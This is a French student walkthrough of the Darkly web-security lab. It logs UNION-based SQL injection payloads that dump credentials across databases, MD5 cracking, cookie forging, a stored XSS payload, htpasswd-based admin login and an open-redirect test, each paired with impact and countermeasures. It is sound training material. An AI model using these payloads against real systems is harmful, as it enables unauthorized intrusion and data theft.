# Darkly — Walkthrough complet

> Chronologie de ma progression sur les **13 breaches obligatoires** + 5 bonus.
> Détails techniques dans chaque sous-dossier `XX_Breach_Name/Resources/`.

---

## Mapping intra → breach

Liste officielle (grille de défense 42) :

| # | Nom intra | Statut | Flag |
|---|---|---|---|
| 1 | SQL injection basic | ✅ | `10a16d83...` |
| 2 | SQL injection avancée | ✅ | `f2a29020...` |
| 3 | Include | ❌ | LFI sur `?page=media&src=` |
| 4 | XSS basic | ✅ | `0fbb54bb...` |
| 5 | XSS advanced | ❌ | — |
| 6 | Cookies | ✅ | `df2eb4ba...` |
| 7 | Spoof (curl) | ❌ | User-Agent / Referer manipulation |
| 8 | Admin (htpasswd) | ✅ | `d19b4823...` |
| 9 | Bruteforce (member) | ❌ | base `Member_Brute_Force` / table `db_default` |
| 10 | File upload | ❌ | — |
| 11 | Redirect | ✅ | `b9e775a0...` |
| 12 | Guess (hidden file) | ✅ | `df2eb4ba...` |
| 13 | Survey | ✅ | (récupéré via cross-DB SQLi) |
| — | Recover | ❌ | Position grille ambiguë |

**Bonus (5)** — uniquement si les 13 obligatoires sont validées :
- XSS understanding
- SQL understanding
- Redirect understanding
- Bruteforce understanding
- robots.txt understanding

**Score : 9/13 obligatoires**

---

## Format de défense exigé (par breach)

Pour CHAQUE breach, l'évaluateur attend :
1. **Basic functioning** — comment trouvée et exploitée
2. **Method to avoid** — contre-mesure technique précise
3. **Impact** — ce qu'un attaquant peut faire en réel
4. **Both flags identical** — comparaison flag obtenu vs flag du `subject.pdf`

→ Avoir le `subject.pdf` ouvert pendant la défense pour comparer chaque flag.

---

## Setup initial
- VM Darkly (i386) lancée
- Accès via navigateur
- Burp Suite en proxy

---

## Phase 1 — Reconnaissance initiale

### WhatWeb
$ whatweb 127.0.0.1:8080

Résultats clés :
- **PHP 5.5.9-1ubuntu4.29** (obsolète, multiples CVE)
- **nginx 1.4.6** (2014, très ancien)
- **Cookie suspect : I_am_admin** → piste immédiate d'élévation de privilège
- **JQuery, HTML5** → stack front classique

### Cartographie manuelle
Endpoints identifiés via navigation et Ctrl+U :
- Pages principales : `?page=survey`, `?page=member`, `?page=signin`
- Upload/search : `?page=upload`, `?page=searchimg`
- Feedback : `?page=feedback`
- Redirect : `?page=redirect&site=facebook` (param `site` → open redirect)
- Media : `?page=media&src=nsa` (param `src` → LFI ?)
- **Hash caché dans le footer** : `?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

### robots.txt
$ curl http://127.0.0.1:8080/robots.txt

User-agent: *
Disallow: /whatever
Disallow: /.hidden

→ Deux chemins "cachés" révélés par le dev lui-même.

### /whatever/
- Listing de répertoire activé (Directory Listing enabled)
- Contient un seul fichier : `htpasswd`

### /.hidden/
- Listing de répertoire activé
- Contient 26 dossiers (un par lettre) + README
- Structure labyrinthique récursive → **rabbit hole** (à confirmer plus tard, mis en standby)

### Gobuster
- 🟡 En cours : wordlist custom créée, scan à relancer avec `--exclude-length 975` (le serveur renvoie 200 sur toutes URLs inexistantes, taille fixe = page 404 déguisée par index.php)

---

## Cartographie SQL — bases et tables identifiées

Énumération exhaustive depuis l'injection sur `?page=member` :

```sql
0 UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```

**6 bases découvertes** :

| Base | Table | Endpoint mappé | Breach intra |
|---|---|---|---|
| `information_schema` | (système) | — | — |
| `Member_Sql_Injection` | `users` | `?page=member` | #1 ✅ |
| `Member_images` | `list_images` | `?page=searchimg` | #2 ✅ |
| `Member_guestbook` | `guestbook` | `?page=feedback` | #4 ✅ |
| `Member_Brute_Force` | `db_default` | ? | #9 (à exploiter) |
| `Member_survey` | `vote_dbs` | `?page=survey` | #13 ✅ |

### Privilèges MySQL
```sql
0 UNION SELECT user(),version()-- -
```
- **User** : `borntosec@localhost` (compte applicatif, pas root)
- **Version** : `5.5.64-MariaDB-1ubuntu0.14.04.1` (fin de support 2020)
- → Pas de RCE via `INTO OUTFILE` probable, pas d'accès `mysql.user`
- → Lecture des 5 bases `Member_*` confirmée

### Colonnes de `vote_dbs` (Survey)
| Colonne | Type |
|---|---|
| `id_vote` | int |
| `vote` | float |
| `nb_vote` | int |
| `subject` | varchar (← contient le hint/flag) |

→ Cartographie pré-emptive : Bruteforce et Survey **étaient SQL-backed** avant même de visiter ces endpoints.

---

## Breach intra #6 — Cookies (Cookie Manipulation)

**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `01_Cookie_Manipulation/`

### Résumé
Cookie `I_am_admin` = `68934a3e9455fa72420237eb05902327` = md5("false").
Cracké via CrackStation. Forge de md5("true") → flag affiché.

### Commandes clés
$ echo -n "false" | md5sum   → confirme md5(false)
$ echo -n "true"  | md5sum   → b326b5062b2f0e69046810717534cb09

### Impact
Élévation de privilège via cookie côté client = compromission complète du modèle d'autorisation. L'attaquant accède aux fonctionnalités admin sans authentification.

### Contre-mesure
- **Ne jamais stocker l'état d'autorisation côté client.** Stocker un session ID opaque côté client, le rôle dans la session serveur.
- Cookies signés (HMAC) ou JWT signé si l'état doit voyager.
- `HttpOnly`, `Secure`, `SameSite=Strict`.

---

## Breach intra #12 — Guess (Hidden File / Information Disclosure)
**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `02_Hidden_Page/`

### Résumé
Lien caché dans le footer de `index.php` pointant vers une page "obscure" nommée avec un SHA-256 :
`?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

La page sert directement un `<script>alert('Good job! Flag : ...')</script>` en dur. Flag obtenu par simple clic.

### Faille exploitée
- **Security Through Obscurity** : le dev a cru cacher la page en la nommant avec un hash improbable.
- **Information Disclosure** : le lien est laissé visible dans le HTML du footer, accessible via Ctrl+U ou clic.

### Règle violée
> L'URL n'est pas un secret. Toute ressource non protégée par authentification est publique.

### Bénéfice (recherche)
Démontre l'importance du **view-source systématique** sur chaque page d'une cible. La logique de recherche : tout le HTML rendu doit être lu, pas seulement le visible.

---

## Breach intra #8 — Admin (htpasswd)
**Flag :** `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`
**Dossier :** `03_Admin_Htpasswd/`

### Résumé
Combine 3 étapes :
1. **Disclosure** du fichier `htpasswd` via directory listing sur `/whatever/`
2. **Crack** du hash MD5 → mot de passe en clair
3. **Auth bypass** sur `/admin/` réutilisant les mêmes credentials

### Méthode

**1. Découverte du fichier**
- `robots.txt` → chemin `/whatever/` révélé
- Listing directory actif → fichier `htpasswd` visible
- `curl http://127.0.0.1:8080/whatever/htpasswd` → `root:437394baff5aa33daa618be47b75cb49`

**2. Crack**
- 32 hexa → MD5
- CrackStation → `qwerty123@`

**3. Authentification sur /admin/**
- Test du chemin physique `/admin/` (hors routeur `?page=`)
- `curl http://127.0.0.1:8080/admin/` → formulaire de login (200, pas de Basic Auth nginx)
- POST :
   ```
   curl -X POST http://127.0.0.1:8080/admin/ \
     -d "username=root&password=qwerty123@&Login=Login"
   ```
- Réponse : `<h2>The flag is : d19b4823...</h2>`

### Architecture défaillante
Deux systèmes de routing parallèles :
- **`?page=X`** → routeur PHP via `index.php`
- **`/admin/`** → chemin physique servi directement par nginx

Cumul de fautes :
- Le htpasswd existe mais n'est pas configuré dans nginx (`auth_basic` absent)
- Le formulaire PHP valide en dur contre les **mêmes creds** que ceux exposés publiquement
- Aucun rate limiting, aucune 2FA
- Typo `recquired` → indicateur de code amateur

### Failles cumulées
- **Security Misconfiguration** — Directory listing actif
- **Information Disclosure via robots.txt**
- **Cryptographic Failure** — MD5 non salé
- **Weak Password** — `qwerty123@` dans rockyou.txt
- **A07:2021 — Identification and Authentication Failures** (credential reuse)

### Contre-mesures
- nginx : `auth_basic` + `auth_basic_user_file` sur `/admin/`
- Stocker htpasswd **hors document root** (`/etc/nginx/.htpasswd`)
- bcrypt au lieu de MD5 (`htpasswd -B`)
- `autoindex off;` dans nginx
- Rate limiting via `limit_req` nginx
- 2FA TOTP côté applicatif

---

## Breach intra #4 — XSS basic (Stored XSS)
**Flag :** `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`
**Dossier :** `04_Stored_XSS/`

### Résumé
Injection d'un payload `<script>alert(...)</script>` dans le formulaire `?page=feedback`. Le serveur stocke et restitue l'input sans échappement → exécution du JS au rendu de la page.

### Méthode
1. Champ vulnérable identifié sur `?page=feedback`
2. Payload injecté : `<script>alert('XSS')</script>`
3. Submit → reload → script exécuté → flag affiché

### Faille exploitée
- **Stored XSS (OWASP A03:2021 — Injection)**
- Absence de sanitization à l'entrée
- Absence d'output encoding à la sortie (pas de `htmlspecialchars()` côté PHP)

### Impact
- Vol de cookies de session (`document.cookie`) si `HttpOnly` absent
- Keylogging via JS injecté
- Phishing intégré (overlay de faux formulaire)
- Propagation worm-style sur tous les utilisateurs visitant la page

### Contre-mesures
- `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` à l'affichage (PHP)
- Auto-escape dans React/Vue (déjà appliqué dans VoidTextile, Camagru)
- `Content-Security-Policy: script-src 'self'` pour bloquer les scripts inline
- Cookies `HttpOnly` pour empêcher le vol de session via XSS
- Validation stricte des inputs côté serveur

---

## Breach intra #1 — SQL injection basic (`?page=member`)
**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
**Dossier :** `06_SQLi_Member/`

### Résumé
Injection SQL UNION-based sur le param `id` de `?page=member`. Énumération du schéma via `information_schema`, extraction des credentials de la table `users`, crack MD5 → transformation lower + SHA256 = flag.

### Méthode complète

**1. Détection de l'injection**
```
?page=member&id=1&Submit=Submit
→ ID: 1 - First name: one - Surname: me

?page=member&id=submit&Submit=Submit
→ "Unknown column 'submit' in 'where clause'"
   → Confirmation : input inséré non quoté dans WHERE id = $input

?page=member&id=1' OR 1=1-- -&Submit=Submit
→ "You have an error in your SQL syntax... near '\''" (MariaDB error visible)

?page=member&id=1 OR 1=1-- -&Submit=Submit
→ Retourne TOUS les enregistrements (dont "First name: Flag - Surname: GetThe")
```

**2. Énumération du nombre de colonnes (ORDER BY)**
```
?id=1 ORDER BY 1-- -    → OK
?id=1 ORDER BY 2-- -    → OK
?id=1 ORDER BY 3-- -    → "Unknown column '3' in 'order clause'"
```
→ Requête à **2 colonnes**.

**3. Mapping des colonnes via UNION SELECT**
```
?id=0 UNION SELECT 1,2-- -
→ First name: 1 - Surname: 2
```
→ col1 → First name, col2 → Surname

**4. Énumération des bases**
```
?id=0 UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```
→ 6 bases (cf. cartographie SQL plus haut). Base courante = `Member_Sql_Injection`.

**5. Énumération du schéma de la base courante**
```
?id=0 UNION SELECT column_name,table_name FROM information_schema.columns WHERE table_schema=database()-- -
```
Table `users` avec colonnes : `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, **`countersign`** ← suspect.

**6. Extraction des credentials**
```
?id=0 UNION SELECT countersign,Commentaire FROM users-- -
```
4 hashes MD5 + commentaires. Le 4e contient l'indice :
> `5ff9d0165b4f92b14994e5c685cdce28`
> "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

**7. Crack et transformation**
- CrackStation : `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
- Lower : `fortytwo`
- SHA-256 : `echo -n "fortytwo" | sha256sum` → `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Failles exploitées
- **A03:2021 — Injection (SQLi)** : aucune préparation/échappement du param `id`
- **Verbose error messages** : MariaDB renvoie l'erreur SQL complète au client (révèle nom de la base via `Member_Sql_Injection.user doesn't exist`)
- **Cryptographic Failure** : MD5 non salé pour stocker des mots de passe
- **Information Disclosure** : indice du flag stocké en clair dans la base

### Impact
- Dump complet de la base utilisateurs (credentials, données personnelles)
- Lecture cross-database via `information_schema` (6 bases accessibles)
- RCE potentielle si `INTO OUTFILE` autorisé + writable webroot
- Authentification forgée (UNION pour bypass login)

### Contre-mesures
- Requêtes préparées (PDO en PHP) : `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?")`
- Cast strict du param : `intval($_GET['id'])`
- Désactiver les erreurs SQL en production (`display_errors = Off`)
- bcrypt/argon2 pour stocker des mots de passe
- Principe du moindre privilège sur le compte MySQL applicatif (pas d'accès `information_schema` au-delà du nécessaire)

---

## Breach intra #2 — SQL injection avancée (`?page=searchimg`)
**Flag :** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
**Dossier :** `07_SQLi_SearchImg/`

### Résumé
Même pattern que breach #1 mais sur un autre endpoint. SQLi UNION sur `?page=searchimg&id=`. La base utilisée est **différente** (`Member_images`) — le serveur fait un `mysql_select_db()` différent selon la page. Erreurs SQL masquées (display_errors off sur cette page) → injection blind-style à la détection.

### Méthode

**1. Détection silencieuse**
Pas d'erreur SQL visible (au contraire de member), mais comportement différent :
```
?id=1&Submit=Submit                  → ID: 1 - Title: Nsa - Url : ...
?id=1 ORDER BY 1-- -&Submit=Submit   → OK
?id=1 ORDER BY 2-- -&Submit=Submit   → OK
?id=1 ORDER BY 3-- -&Submit=Submit   → résultat vide (injection plante silencieusement)
```
→ 2 colonnes, mais erreurs supprimées côté display.

**2. Confirmation UNION**
```
?id=0 UNION SELECT 1,2-- -&Submit=Submit
→ Title: 2 - Url: 1   (mapping: col1 = Url, col2 = Title)
```

**3. Énumération du schéma**
```
?id=0 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()-- -
```
**Une seule table** : `list_images` avec colonnes `id`, `url`, `title`, `comment`.

**4. Extraction du contenu**
```
?id=0 UNION SELECT comment,title FROM list_images-- -
```
5 enregistrements. Le 5e contient l'indice :
> "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

**5. Crack et transformation**
- CrackStation : `1928e8083cf461a51303633093573c46` → `albatroz`
- Lower : `albatroz` (déjà en minuscules)
- SHA-256 : `echo -n "albatroz" | sha256sum` → `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Différences avec breach #1
- **Erreurs SQL masquées** : Darkly a appliqué `display_errors = Off` sur cette page mais pas sur member → incohérence de hardening
- **Database différente** : preuve que le serveur fait du `mysql_select_db()` dynamique → architecture multi-base
- **Indice directement dans `comment`** : la table contenait littéralement les instructions du flag

### Impact (avancé)
Mêmes vecteurs que breach #1, plus :
- Détection à l'aveugle plus difficile (blind SQLi via boolean-based ou time-based si pas d'erreur)
- Pivot cross-database démontré : depuis ce point d'injection, possibilité d'accéder à toutes les bases du serveur via `information_schema`

### Leçon méthodologique
Toutes les colonnes de toutes les tables doivent être dump dans un pentest. Les indices (et secrets) se cachent souvent dans `comment`, `description`, `notes`, `metadata`, `meta`, `info`.

---

## Breach intra #13 — Survey (SQLi cross-database via `?page=member`)
**Flag :** `[à reporter dans dossier 08_Survey/]`
**Dossier :** `08_Survey/`

### Résumé
Le flag de la breach Survey est récupéré **sans visiter `?page=survey`**, depuis l'injection SQL sur `?page=member` (breach #1). Démonstration concrète de l'impact "multi-base = surface d'attaque démultipliée" : un seul point d'injection compromet toutes les bases lisibles par le compte MySQL applicatif.

### Méthode

**1. Cartographie des bases via `?page=member`**
```
?id=0 UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```
→ Découverte de `Member_survey`.

**2. Énumération des tables de `Member_survey`**
```
?id=0 UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema LIKE 0x4d656d6265725f25-- -
```
→ Table `vote_dbs`.

**3. Énumération des colonnes**
```
?id=0 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name=0x766f74655f646273-- -
```
Colonnes : `id_vote` (int), `vote` (float), `nb_vote` (int), `subject` (varchar).

**4. Dump cross-database**
```
?id=0 UNION SELECT subject,id_vote FROM Member_survey.vote_dbs-- -
```
→ Flag dans la colonne `subject`.

### Faille exploitée
- **Cross-database SQLi** : aucun cloisonnement entre les bases côté MySQL. Le compte `borntosec@localhost` a `SELECT` sur **toutes** les bases `Member_*`.
- **Architecture multi-base sans isolation** : chaque endpoint utilise sa propre base, mais toutes partagent le même utilisateur MySQL applicatif → un point d'injection compromet l'ensemble.

### Impact
- **Compromission totale** du modèle de données de l'application depuis n'importe quel endpoint vulnérable
- Exfiltration silencieuse de la base Survey sans laisser de trace dans les logs de `?page=survey`
- Pivot vers Bruteforce (`Member_Brute_Force.db_default`) théoriquement faisable par la même méthode

### Contre-mesures
- **Comptes MySQL distincts par base** : `member_user@localhost` n'a accès qu'à `Member_Sql_Injection`, `survey_user` qu'à `Member_survey`, etc.
- **Principe du moindre privilège** : `REVOKE ALL ON information_schema.* FROM borntosec` (limite l'énumération)
- Requêtes préparées sur tous les endpoints (élimine la SQLi à la source)

---

## Breach intra #11 — Redirect (Open Redirect)
**Flag :** `b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3`
**Dossier :** `09_Redirect/`

### Résumé
Le param `site` de `?page=redirect&site=X` est utilisé pour construire une redirection sans validation stricte. Quand `site` n'est pas dans la whitelist (`facebook`, `twitter`, `instagram`), le serveur expose le flag directement dans le HTML au lieu de rediriger.

### Méthode

**1. Comportement nominal**
```bash
curl -s "http://127.0.0.1:8080/?page=redirect&site=facebook"
→ Page vide (redirect probable côté JS ou silencieux)
```

**2. Injection URL externe**
```bash
curl -s "http://127.0.0.1:8080/?page=redirect&site=https://evil.com"
→ HTML contient :
<center><h2>Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3</h2></center>
```

### Logique du serveur (probable)
```php
if (in_array($_GET['site'], ['facebook', 'twitter', 'instagram'])) {
    header("Location: https://" . $_GET['site'] . ".com");
} else {
    echo "Good Job Here is the flag : ...";
}
```
→ La logique est **inversée** par rapport à un open redirect réel : Darkly récompense la tentative de bypass au lieu de rediriger vers le domaine malveillant.

### Faille exploitée
- **A01:2021 — Broken Access Control / Unvalidated Redirect**
- Pas de validation stricte de la valeur du param `site` côté logique métier

### Impact (en conditions réelles)
- **Phishing** : `victim.com/redirect?site=phishing.com` paraît légitime (le domaine de confiance est dans l'URL initiale)
- **Bypass de filtres email/SMS anti-spam** : les filtres font confiance au domaine de redirection
- **Vol de tokens OAuth** : si `redirect_uri` mal validé dans un flow OAuth, vol de codes/tokens
- **SSRF** dans certains cas si le serveur fait lui-même la requête

### Contre-mesures
- **Whitelist stricte côté serveur** : tableau associatif `['facebook' => 'https://facebook.com', ...]`, jamais de concaténation directe avec l'input
- Refus explicite de tout schéma absolu (`http://`, `https://`, `//`) dans le param
- Rediriger uniquement vers des **paths internes relatifs** (`/path`, jamais d'URL absolue construite depuis user input)
- Si redirect externe nécessaire : page d'avertissement intermédiaire ("Vous quittez le site...")

---

## État global

| Intra # | Breach | Statut | Flag |
|---|---|---|---|
| 1 | SQL injection basic | ✅ | `10a16d83...` |
| 2 | SQL injection avancée | ✅ | `f2a29020...` |
| 3 | Include | ❌ | LFI `?page=media&src=` |
| 4 | XSS basic | ✅ | `0fbb54bb...` |
| 5 | XSS advanced | ❌ | — |
| 6 | Cookies | ✅ | `df2eb4ba...` |
| 7 | Spoof (curl) | ❌ | — |
| 8 | Admin (htpasswd) | ✅ | `d19b4823...` |
| 9 | Bruteforce (member) | ❌ | base `Member_Brute_Force` cartographiée |
| 10 | File upload | ❌ | — |
| 11 | Redirect | ✅ | `b9e775a0...` |
| 12 | Guess (hidden file) | ✅ | `df2eb4ba...` |
| 13 | Survey | ✅ | (récupéré via cross-DB SQLi) |

**Score : 9/13 obligatoires**

---

## Prochaines pistes à tester (ordre de priorité)

### Priorité haute — ROI rapide
- [ ] **Breach #7 — Spoof (curl)** : User-Agent / Referer / X-Forwarded-For à manipuler. Tester sur chaque page indication "you must come from / use browser X"
- [ ] **Breach #3 — Include (LFI)** : `?page=media&src=` → filtre `php://filter` détecté, tester `../`, encodage URL, null byte

### Priorité moyenne
- [ ] **Breach #5 — XSS advanced** : Reflected XSS, probablement sur un param GET d'un autre endpoint (peut-être `?page=searchimg&id=` après contournement filtre)
- [ ] **Breach #9 — Bruteforce member** : Hydra sur formulaire login member, base `Member_Brute_Force.db_default` (déjà cartographiée — dump direct possible via SQLi pour pré-identifier le user/pass cible)
- [ ] **Breach #10 — File upload** : critère caché à identifier (extensions, magic bytes, dimensions)

### Priorité basse / parallèle
- [ ] **Recover** (position grille ambiguë) : SQLi probable sur formulaire recover
- [ ] **Gobuster** : finir le scan avec `--exclude-length 975`
- [ ] **`.hidden/` parsing** : `wget -r` + grep récursif (bypass du rabbit hole textuel)
- [ ] **sitemap.xml** : vérification rapide

### Bonus (après validation des 13 obligatoires)
- [ ] XSS understanding (théorie avancée + impact)
- [ ] SQL understanding
- [ ] Redirect understanding
- [ ] Bruteforce understanding
- [ ] robots.txt understanding

---

## Leçons techniques cumulées
1. **Reconnaissance d'abord** : `whatweb`, `robots.txt`, Ctrl+U, sitemap → toujours avant tout payload
2. **Deux systèmes de routing peuvent coexister** : routeur applicatif (`?page=`) vs filesystem (`/admin/`). Tester les deux.
3. **MD5 et SHA-1 sont morts** pour le stockage de mots de passe. CrackStation casse en secondes.
4. **Security through obscurity ≠ sécurité** : breach #12 et #8 démontrent que cacher un chemin n'est pas une protection.
5. **Credential reuse** = faille systémique. Un seul secret exposé compromet tous les systèmes qui le réutilisent.
6. **Méthode SQLi UNION-based** : (1) détecter avec `'` ou nom de colonne invalide, (2) compter les colonnes via `ORDER BY`, (3) mapper via `UNION SELECT 1,2,...`, (4) énumérer schéma via `information_schema`, (5) extraire les colonnes intéressantes (passwords, comments, secrets).
7. **Verbose error messages** = fuite d'information critique. Une erreur SQL complète révèle le SGBD, la version, la base courante (via `Base.table doesn't exist`), la structure de la requête.
8. **Multi-base = surface d'attaque démultipliée** : un même serveur peut servir plusieurs databases différentes selon la page. Énumérer `information_schema.schemata` depuis un seul point d'injection révèle la totalité de la surface SQL. Démontré concrètement sur breach #13 (Survey récupéré sans visiter `?page=survey`).
9. **Pattern Darkly récurrent** : MD5 → CrackStation → lower → SHA-256 = flag. À tester systématiquement quand un hash est extrait.
10. **Toutes les colonnes valent le dump** : indices et secrets se cachent souvent dans `comment`, `description`, `notes`, `metadata`, `subject`.
11. **Input non quoté = pas besoin de fermer une string** : si `WHERE id = $input` (sans quotes), tu peux injecter directement `1 OR 1=1` sans `'`. Test diagnostic : envoyer un mot quelconque, si le serveur répond `Unknown column 'mot'` = input traité comme identifiant SQL non quoté.
12. **Format `base.table` MySQL** : toute table appartient à une base. Si on omet la base, MariaDB préfixe automatiquement la base courante. Les erreurs `Base.table doesn't exist` sont une fuite gratuite du nom de la base courante.
13. **Hex literal `0x...`** : équivalent strings sans guillemets. Évite les problèmes d'encodage URL et de filtres WAF qui bloquent les quotes. `0x7573657273` = `'users'`. Générer avec `echo -n "string" | xxd -p`.
14. **Pattern Darkly Open Redirect** : la logique est inversée — le flag s'affiche quand le bypass de whitelist est tenté, pas quand la redirection s'effectue. À tester systématiquement avec une URL hors whitelist sur tout endpoint de redirection.
